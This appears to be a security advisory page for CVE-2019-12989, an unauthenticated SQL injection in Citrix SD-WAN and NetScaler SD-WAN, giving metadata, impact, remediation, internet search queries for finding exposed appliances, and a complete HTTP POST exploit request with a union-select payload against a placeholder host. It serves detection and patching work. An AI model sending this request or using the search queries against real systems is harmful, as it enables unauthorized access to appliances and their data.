---
layout: post
cve_id: CVE-2019-12989
title: Citrix SD-WAN and NetScaler SD-WAN - SQL Injection
pcap: true
pcap_path: /pcaps/2019/CVE-2019-12989.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-12989.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Successful exploitation may allow a remote unauthenticated attacker to execute
  SQL commands on the system, potentially resulting in unauthorized access, data leakage,
  modification of critical data, or full compromise of the SD-WAN appliance.

  '
remediation: 'Apply the vendor patch: upgrade Citrix SD-WAN to version 10.2.3 or later,
  and NetScaler SD-WAN to version 10.0.8 or later as detailed in the official Citrix
  advisory.

  '
reference:
- http://packetstormsecurity.com/files/153638/Citrix-SD-WAN-Appliance-10.2.2-Authentication-Bypass-Remote-Command-Execution.html
- https://support.citrix.com/article/CTX251987
- https://www.tenable.com/security/research/tra-2019-32
- https://nvd.nist.gov/vuln/detail/CVE-2019-12989
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-12989
  epss-score: 0.91054
  epss-percentile: 0.99617
  cwe-id: CWE-89
  cpe: cpe:2.3:a:citrix:netscaler_sd-wan:*:*:*:*:*:*:*:*
metadata:
  verified: false
  max-request: 1
  vendor: citrix
  product: netscaler_sd-wan
  fofa-query: (title="citrix sd-wan") && icon_hash="177980953"
  google-query: intitle:"citrix sd-wan"
tags:
- cve
- cve2019
- citrix
- sqli
- kev
- vkev
---

## üîç Vulnerability Description
Citrix SD-WAN 10.2.x before 10.2.3 and NetScaler SD-WAN 10.0.x before 10.0.8 contain an SQL injection vulnerability. An unauthenticated attacker can exploit improper validation of input in specific components, which could allow for execution of arbitrary SQL queries against the backend database. This could result in information disclosure, manipulation of data, or complete compromise of affected systems.


## üåê HTTP Request
```nohighlight
POST /sdwan/nitro/v1/config/get_package_file?action=file_download HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WOW64; rv:41.0) Gecko/20100101 Firefox/140.0.4 (x64 de)
Connection: close
Content-Length: 137
Content-Type: application/json
SSL_CLIENT_VERIFY: SUCCESS
Accept-Encoding: gzip
{"get_package_file": {"site_name": "test' union select md5(8234), 'x', 'y', 'z' #","appliance_type": "primary","package_type": "active"}}
```

